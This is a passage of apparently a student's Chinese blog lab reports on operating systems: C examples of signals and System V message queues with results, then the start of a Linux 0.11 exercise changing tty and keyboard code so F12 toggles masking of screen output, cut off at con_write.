<li><p><code>shutdown.c</code>程序分析：该程序由一个父进程和一个子进程组成。首先父进程尝试去<code>fork</code>一个子进程，如果<code>fork</code>成功，每个进程去执行自己的代码，即子进程执行<code>child_code</code>，父进程执行<code>parent_code</code>。子进程将会进入一个潜在的无线循环，在该循环中子进程将睡眠一秒，然后打印一个信息。来自父进程的一个<code>SIGTERM</code>信号将引起子进程去执行一个信号处理回调函数 <code>graceful</code>。这样这个信号就使子进程跳出循环，然后进行子进程和父进程的终止，并打印消息。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">graceful</span><span class="params">(<span class="type">int</span> signum)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\tChild confirming received signal: %i\n&quot;</span>, signum);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\tChild about to terminate gracefully...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\tChild terminating now...&quot;</span>);</span><br><span class="line">  _exit(<span class="number">0</span>); <span class="comment">/* fast-track notification of parent */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_handler</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">current</span>;</span></span><br><span class="line">  sigemptyset(&amp;current.sa_mask);         <span class="comment">/* clear the signal set */</span></span><br><span class="line">  current.sa_flags = <span class="number">0</span>;<span class="comment">/* enables setting sa_handler, not sa_action */</span></span><br><span class="line">  current.sa_handler = graceful;         <span class="comment">/* specify a handler */</span></span><br><span class="line">  sigaction(SIGTERM, &amp;current, <span class="literal">NULL</span>);    <span class="comment">/* register the handler */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">child_code</span><span class="params">()</span> &#123;</span><br><span class="line">  set_handler();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;   <span class="comment">/** loop until interrupted **/</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\tChild just woke up, but going back to sleep.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">parent_code</span><span class="params">(<span class="type">pid_t</span> cpid)</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Parent sleeping for a time...&quot;</span>);</span><br><span class="line">  sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to terminate child. */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">-1</span> == kill(cpid, SIGTERM)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;kill&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wait(<span class="literal">NULL</span>); <span class="comment">/** wait for child to terminate **/</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;My child terminated, about to exit myself...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;main...&quot;</span>);</span><br><span class="line">  <span class="type">pid_t</span> pid = fork();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;main...2&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">/* error */</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;main...3&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == pid)&#123; </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;child_code...&quot;</span>);</span><br><span class="line">    child_code();</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;parent_code...&quot;</span>);</span><br><span class="line">    parent_code(pid);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">/* normal */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="队列通信-sender-receiver"><a href="#队列通信-sender-receiver" class="headerlink" title="队列通信 ./sender ./receiver"></a>队列通信 <code>./sender ./receiver</code></h2><ol>
<li><p>消息队列是一系列的消息，每个消息包括两个部分：荷载，一个字节序列；类型，以一个正整数值得形式给定，类型用来分类消息，为了更灵活的回收。</p>
</li>
<li><p>下面展示的 4 个消息中，标记为 1 的是开头，即最接近接收端，接着连续标记为 2 的消息，最后接着一个标记为 3 的消息。假如按照严格的<code>FIFO</code>行为执行，消息将会以<code>1-2-2-3</code>这样的次序被接收。但是消息队列允许其他收取次序。例如，消息可以被接收方以<code>3-2-1-2</code>的次序接收。说明消息队列足够的灵活。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125112906.png"></p>
</li>
<li><p><code>sender.c</code>：通过<code>megsnd</code>函数程序发送<code>sender</code>程序将发送出 6 个消息，每两个为一个类型：前两个是类型 1，接着的连个是类型 2，最后的两个为类型 3。且被配置为非阻塞的<code>IPC_NOWAIT</code>标志。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;queue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">report_and_exit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* EXIT_FAILURE */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">key_t</span> key = ftok(PathName, ProjectId); </span><br><span class="line">  <span class="keyword">if</span> (key &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;couldn&#x27;t get key...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> qid = msgget(key, <span class="number">0666</span> | IPC_CREAT); </span><br><span class="line">  <span class="keyword">if</span> (qid &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;couldn&#x27;t get queue id...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span>* payloads[] = &#123;<span class="string">&quot;msg1&quot;</span>, <span class="string">&quot;msg2&quot;</span>, <span class="string">&quot;msg3&quot;</span>, <span class="string">&quot;msg4&quot;</span>, <span class="string">&quot;msg5&quot;</span>, <span class="string">&quot;msg6&quot;</span>&#125;;</span><br><span class="line">  <span class="type">int</span> types[] = &#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>&#125;; <span class="comment">/* each must be &gt; 0 */</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MsgCount; i++) &#123;</span><br><span class="line">    <span class="comment">/* build the message */</span></span><br><span class="line">    queuedMessage msg;</span><br><span class="line">    msg.type = types[i];</span><br><span class="line">    <span class="built_in">strcpy</span>(msg.payload, payloads[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* send the message */</span></span><br><span class="line">    msgsnd(qid, &amp;msg, <span class="keyword">sizeof</span>(msg), IPC_NOWAIT); <span class="comment">/* don&#x27;t block */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s sent as type %i\n&quot;</span>, msg.payload, (<span class="type">int</span>) msg.type);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>receiver.c</code>程序分析：对<code>msgget</code>的调用可能因为带有<code>IPC_CREAT</code>标志而具有误导性，但是这个标志的真实意义是如果需要就创建，否则直接获取。<code>sender</code>程序调用<code>msgsnd</code>来发送消息，而<code>receiver</code>调用<code>msgrcv</code>来接收它们。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;queue.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">report_and_exit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span> &#123;</span><br><span class="line">  perror(msg);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>); <span class="comment">/* EXIT_FAILURE */</span></span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; </span><br><span class="line">  <span class="type">key_t</span> key= ftok(PathName, ProjectId); <span class="comment">/* key to identify the queue */</span></span><br><span class="line">  <span class="keyword">if</span> (key &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;key not gotten...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> qid = msgget(key, <span class="number">0666</span> | IPC_CREAT); <span class="comment">/* access if created already */</span></span><br><span class="line">  <span class="keyword">if</span> (qid &lt; <span class="number">0</span>) report_and_exit(<span class="string">&quot;no access to queue...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> types[] = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>&#125;; <span class="comment">/* different than in sender */</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MsgCount; i++) &#123;</span><br><span class="line">    queuedMessage msg; <span class="comment">/* defined in queue.h */</span></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(qid, &amp;msg, <span class="keyword">sizeof</span>(msg), types[i], MSG_NOERROR | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;msgrcv trouble...&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s received as type %i\n&quot;</span>, msg.payload, (<span class="type">int</span>) msg.type);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** remove the queue **/</span></span><br><span class="line">  <span class="keyword">if</span> (msgctl(qid, IPC_RMID, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)  <span class="comment">/* NULL = &#x27;no flags&#x27; */</span></span><br><span class="line">    report_and_exit(<span class="string">&quot;trouble removing queue...&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="实验数据与结果"><a href="#实验数据与结果" class="headerlink" title="实验数据与结果"></a>实验数据与结果</h1><h2 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h2><ol>
<li><p>使用<code>make</code>命令编译程序；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125114909.png"></p>
</li>
<li><p>执行<code>./producer</code>，程序向<code>data.dat</code>写入数据；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125115118.png"><br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125115349.png"></p>
</li>
<li><p>在终端输入<code>./consumer</code>，显示data.dat中的内容</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125115447185.png" alt="image-20191125115447185"></p>
</li>
</ol>
<h2 id="内存共享"><a href="#内存共享" class="headerlink" title="内存共享"></a>内存共享</h2><ol>
<li><p>向内存中写入信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125122459.png"></p>
</li>
<li><p>从内存中读取信息</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125122557.png"></p>
</li>
</ol>
<h2 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h2><ol>
<li><p>开启两个终端(两个终端工作目录相同)在其中一个终端输入以下命令：即先创建一个备份文件，名为2017213618，然后将管道的内容输出到stdout中。最开始并没有什么会出现在终端中，因为还没有向管道中写入任何数据。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125120847.png"></p>
</li>
<li><p>在第二个终端输入以下命令无论在这个终端中输入什么，它都会在第一个终端中显示出来；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125121030.png"></p>
</li>
<li><p>一旦键入<code>Ctrl+C</code>，就会回到正常的命令行提示符，因为管道已经被关闭了。最后通过移除实现命名管道的文件来进行清理。</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125121214465.png" alt="image-20191125121214465"></p>
</li>
<li><p>不同的终端中启动<code>fifoWriter</code> 和<code>fifoReader</code>，但二者处于相同的工作目录。<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125121419.png"></p>
</li>
</ol>
<h2 id="信号量互斥"><a href="#信号量互斥" class="headerlink" title="信号量互斥"></a>信号量互斥</h2><ol>
<li><p>在终端输入<code>./shutdown</code>，得到如下输出，成功的模拟了信号的这种轻量的<code>IPC</code>方法。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125121535.png"></p>
</li>
</ol>
<h2 id="队列通信"><a href="#队列通信" class="headerlink" title="队列通信"></a>队列通信</h2><ol>
<li><p>输出显示<code>sender</code>和<code>receiver</code>可以在同一个终端中启动。输出也显示消息队列是持久的，在这个例子中，<code>sender</code>以<code>1-1-2-2-3-3</code>的次序发送消息，但<code>receiver</code>接收它们的次序为<code>3-1-2-1-3-2</code>，表明消息队列没有被严格的<code>FIFO</code>行为所拘束。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125121812.png"> </p>
</li>
</ol>
]]></content>
      <categories>
        <category>操作系统内核实验</category>
      </categories>
      <tags>
        <tag>IPC机制</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统内核 实验六</title>
    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8-%E5%AE%9E%E9%AA%8C%E5%85%AD.html</url>
    <content><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>基本内容是修改Linux 0.11的终端设备处理代码，对键盘输入和字符显示进行非常规的控制.</p>
<span id="more"></span>

<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>修改内核中I/O设备代码，实现按F12，ls命令显示的信息替换成<code>*</code>，再按F12恢复正常，如此反复。</p>
<h1 id="准备知识"><a href="#准备知识" class="headerlink" title="准备知识"></a>准备知识</h1><h2 id="安装虚拟机qemu环境"><a href="#安装虚拟机qemu环境" class="headerlink" title="安装虚拟机qemu环境"></a>安装虚拟机<code>qemu</code>环境</h2><p>安装<code>build-essential</code>软件包和<code>qemu</code>包</p>
<p>其中<code>build-essential</code>软件包的作用是<strong>提供编译程序必须软件包的列表信息</strong>.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></table></figure>

<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125205142.png"></p>
<h2 id="对文件进行编译运行"><a href="#对文件进行编译运行" class="headerlink" title="对文件进行编译运行"></a>对文件进行编译运行</h2><ol>
<li><p>输入<code>make</code>编译</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125210842.png"></p>
</li>
<li><p>输入<code>make start</code>开始运行</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125211111.png"></p>
</li>
<li><p>在虚拟机中按下F12，跳出四个进程信息<br><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20191125211543.png"></p>
</li>
<li><p>输入<code>ls</code>命令显示文件夹内容</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125215521786.png" alt="image-20191125215521786"></p>
</li>
</ol>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="修改kernel-chr-drv-keyboard-S的文件"><a href="#修改kernel-chr-drv-keyboard-S的文件" class="headerlink" title="修改kernel/chr_drv/keyboard.S的文件"></a>修改<code>kernel/chr_drv/keyboard.S</code>的文件</h2><ol>
<li><p>F12功能</p>
<p>键盘I/O是典型的中断驱动，在kernel/chr_drv/console.c文件中，控制台进行初始化，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">con_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	set_trap_gate(<span class="number">0x21</span>,&amp;keyboard_interrupt); </span><br><span class="line">			<span class="comment">//键盘中断响应函数设为keyboard_interrupt</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>所以每次按键有动作，<code>keyboard_interrupt</code>函数就会被调用，它在文件<code>kernel/chr_drv/keyboard.S</code>中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">func:		<span class="comment">/*将功能键转化成转义字符存取到读队列中*/</span></span><br><span class="line">    pushl %eax</span><br><span class="line">    pushl %ecx</span><br><span class="line">    pushl %edx</span><br><span class="line">    call show_stat  </span><br><span class="line">    popl %edx</span><br><span class="line">    popl %ecx</span><br><span class="line">    popl %eax</span><br></pre></td></tr></table></figure></li>
<li><p>分析上述代码，会调用<code>show_stat</code>函数,显示当前进程状态，如下图</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125215443319.png" alt="image-20191125215443319"></p>
</li>
<li><p>将<code>call show_stat</code>注释掉，即可屏蔽掉<code>show_sart</code>函数从而实现要实现的目标功能；</p>
<p><img src="C:\Users\Levi\AppData\Roaming\Typora\typora-user-images\image-20191125215729781.png" alt="image-20191125215729781"></p>
</li>
</ol>
<h2 id="修改kernel-chr-drv-tty-io-c文件"><a href="#修改kernel-chr-drv-tty-io-c文件" class="headerlink" title="修改kernel/chr_drv/tty_io.c文件"></a>修改<code>kernel/chr_drv/tty_io.c</code>文件</h2><ol>
<li><p>键盘每次输入一个字符，操作系统都会将这个字符送到字符缓冲区进行处理，F12是一个功能键，它的扫描码是<code>esc,[,[,L</code> ，分别对应<code>ASCII</code>码的<code>27,91,91,76</code>，所以要连续判断四次字符。如果判断这几个字符的时候输出了一个其他的字符，它应该显示这个其他字符， 这段处理程序就应该写在操作系统判断字符做出功能的代码之前。</p>
</li>
<li><p>修改<code>copy_to_cooked</code>函数，添加处理程序如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 增加的全局变量 */</span></span><br><span class="line"><span class="type">int</span> judge=<span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> f1=<span class="number">0</span>,f2=<span class="number">0</span>,f3=<span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_to_cooked</span><span class="params">(<span class="keyword">struct</span> tty_struct * tty)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">signed</span> <span class="type">char</span> c;</span><br><span class="line">	<span class="comment">//now用来判断当前时间戳</span></span><br><span class="line">	<span class="type">long</span> now;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">while</span> (!EMPTY(tty-&gt;read_q) &amp;&amp; !FULL(tty-&gt;secondary)) &#123;</span><br><span class="line">		GETCH(tty-&gt;read_q,c);</span><br><span class="line">		<span class="comment">//开始添加代码</span></span><br><span class="line">		<span class="keyword">if</span>(c==<span class="number">27</span>)</span><br><span class="line">	    &#123;   </span><br><span class="line">			f1=<span class="number">1</span>;</span><br><span class="line">			j=jiffies;</span><br><span class="line">			<span class="comment">//获取当前函数的CPU心跳数,用来计时</span></span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f1==<span class="number">1</span>&amp;&amp;f2==<span class="number">0</span>&amp;&amp;c==<span class="number">91</span>)</span><br><span class="line">			f2=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f1==<span class="number">1</span>&amp;&amp;f2==<span class="number">1</span>&amp;&amp;c==<span class="number">91</span>)</span><br><span class="line">			f3=<span class="number">1</span>;</span><br><span class="line">	    <span class="keyword">else</span> <span class="keyword">if</span>(f1==<span class="number">1</span>&amp;&amp;f2==<span class="number">1</span>&amp;&amp;f3==<span class="number">1</span>&amp;&amp;c==<span class="number">76</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">			now=jiffies;</span><br><span class="line">			<span class="keyword">if</span>((now-j)&gt;<span class="number">10</span>)</span><br><span class="line">			<span class="comment">//比如人为的输入esc,[,[,L 也会认为是F12,</span></span><br><span class="line">            <span class="comment">//所以要根据四个字符的到达的时间判断是一次输入还是多次输入的</span></span><br><span class="line">	        &#123;</span><br><span class="line">            	printk(<span class="string">&quot;%ld \t %ld \n&quot;</span>,j,now);</span><br><span class="line">            	<span class="keyword">break</span>;</span><br><span class="line">        	&#125;</span><br><span class="line">            judge*=<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        	f1=f2=f3=<span class="number">0</span>;</span><br><span class="line">		<span class="comment">//添加代码结束</span></span><br><span class="line">		<span class="keyword">if</span> (c==<span class="number">13</span>)</span><br><span class="line">			<span class="keyword">if</span> (I_CRNL(tty))</span><br><span class="line">				c=<span class="number">10</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (I_NOCR(tty))</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">else</span> ;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (c==<span class="number">10</span> &amp;&amp; I_NLCR(tty))</span><br><span class="line">			c=<span class="number">13</span>;</span><br><span class="line">		<span class="keyword">if</span> (I_UCLC(tty))</span><br><span class="line">			c=<span class="built_in">tolower</span>(c);</span><br><span class="line">		<span class="keyword">if</span> (L_CANON(tty)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c==KILL_CHAR(tty)) &#123;</span><br><span class="line">				<span class="comment">/* deal with killing the input line */</span></span><br><span class="line">				<span class="keyword">while</span>(!(EMPTY(tty-&gt;secondary) ||</span><br><span class="line">				        (c=LAST(tty-&gt;secondary))==<span class="number">10</span> ||</span><br><span class="line">				        c==EOF_CHAR(tty))) &#123;</span><br><span class="line">					<span class="keyword">if</span> (L_ECHO(tty)) &#123;</span><br><span class="line">						<span class="keyword">if</span> (c&lt;<span class="number">32</span>)</span><br><span class="line">							PUTCH(<span class="number">127</span>,tty-&gt;write_q);</span><br><span class="line">						PUTCH(<span class="number">127</span>,tty-&gt;write_q);</span><br><span class="line">						tty-&gt;write(tty);</span><br><span class="line">					&#125;</span><br><span class="line">					DEC(tty-&gt;secondary.head);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (c==ERASE_CHAR(tty)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (EMPTY(tty-&gt;secondary) ||</span><br><span class="line">				   (c=LAST(tty-&gt;secondary))==<span class="number">10</span> ||</span><br><span class="line">				   c==EOF_CHAR(tty))</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				<span class="keyword">if</span> (L_ECHO(tty)) &#123;</span><br><span class="line">					<span class="keyword">if</span> (c&lt;<span class="number">32</span>)</span><br><span class="line">						PUTCH(<span class="number">127</span>,tty-&gt;write_q);</span><br><span class="line">					PUTCH(<span class="number">127</span>,tty-&gt;write_q);</span><br><span class="line">					tty-&gt;write(tty);</span><br><span class="line">				&#125;</span><br><span class="line">				DEC(tty-&gt;secondary.head);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (c==STOP_CHAR(tty)) &#123;</span><br><span class="line">				tty-&gt;stopped=<span class="number">1</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (c==START_CHAR(tty)) &#123;</span><br><span class="line">				tty-&gt;stopped=<span class="number">0</span>;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (L_ISIG(tty)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c==INTR_CHAR(tty)) &#123;</span><br><span class="line">				tty_intr(tty,INTMASK);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (c==QUIT_CHAR(tty)) &#123;</span><br><span class="line">				tty_intr(tty,QUITMASK);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (c==<span class="number">10</span> || c==EOF_CHAR(tty))</span><br><span class="line">			tty-&gt;secondary.data++;</span><br><span class="line">		<span class="keyword">if</span> (L_ECHO(tty)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c==<span class="number">10</span>) &#123;</span><br><span class="line">				PUTCH(<span class="number">10</span>,tty-&gt;write_q);</span><br><span class="line">				PUTCH(<span class="number">13</span>,tty-&gt;write_q);</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c&lt;<span class="number">32</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span> (L_ECHOCTL(tty)) &#123;</span><br><span class="line">					PUTCH(<span class="string">&#x27;^&#x27;</span>,tty-&gt;write_q);</span><br><span class="line">					PUTCH(c+<span class="number">64</span>,tty-&gt;write_q);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line">				PUTCH(c,tty-&gt;write_q);</span><br><span class="line">			tty-&gt;write(tty);</span><br><span class="line">		&#125;</span><br><span class="line">		PUTCH(c,tty-&gt;secondary);</span><br><span class="line">	&#125;</span><br><span class="line">	wake_up(&amp;tty-&gt;secondary.proc_list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="修改kernel-chr-drv-console-c文件"><a href="#修改kernel-chr-drv-console-c文件" class="headerlink" title="修改kernel/chr_drv/console.c文件"></a>修改<code>kernel/chr_drv/console.c</code>文件</h2><ol>
<li><p><code>tty_io.c</code>文件只是捕捉到了按下F12的状态，还需要在控制程序中添加改变输出的代码，即把所有的字符都变成<code>*</code>；</p>
</li>
<li><p>修改<code>con_write</code>函数：</p>
